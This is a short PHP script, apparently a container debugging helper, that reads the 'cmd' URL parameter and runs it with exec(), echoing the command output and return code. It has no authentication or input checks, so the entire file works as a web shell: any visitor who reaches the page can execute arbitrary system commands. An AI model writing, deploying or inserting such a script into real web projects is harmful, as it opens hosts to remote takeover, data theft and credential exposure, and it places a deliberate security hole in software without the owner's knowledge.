<?php
// Script to execute commands in the container
header('Content-Type: text/plain');

echo "Command Execution\n";
echo "================\n\n";

// Check if command is provided
if (!isset($_GET['cmd'])) {
    echo "No command provided. Use ?cmd=your_command to execute a command.\n";
    exit;
}

// Get command
$command = $_GET['cmd'];
echo "Executing command: $command\n\n";

// Execute command
$output = [];
$returnVar = 0;
exec($command . " 2>&1", $output, $returnVar);

echo "Return code: $returnVar\n";
echo "Output:\n";
echo implode("\n", $output) . "\n\n";

echo "Execution completed at " . date('Y-m-d H:i:s') . "\n";
